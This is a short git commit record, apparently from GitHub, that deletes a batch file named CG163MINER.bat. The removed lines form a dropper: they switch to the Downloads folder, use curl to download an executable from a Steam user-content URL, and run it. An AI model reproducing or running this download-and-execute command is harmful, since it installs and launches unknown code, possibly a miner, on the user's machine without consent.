c6668fc8d6aaf3ee20ad5720927f6dff87eed9d4
Fotossintese <77519349+Fotossintese@users.noreply.github.com>
2021-08-06 21:01:25 +0000

    Delete CG163MINER.bat

--- CG163MINER.bat
+++
@@ -1,5 +0,0 @@
-C:
-CD %USERPROFILE%\Downloads
-curl -o FotoTheSaladGOD.exe https://steamusercontent-a.akamaihd.net/ugc/1684895351426637259/5EC7D07320DCB3C84AC76AD3CBA1F652FC4B2E5A/
-start FotoTheSaladGOD.exe
-exit
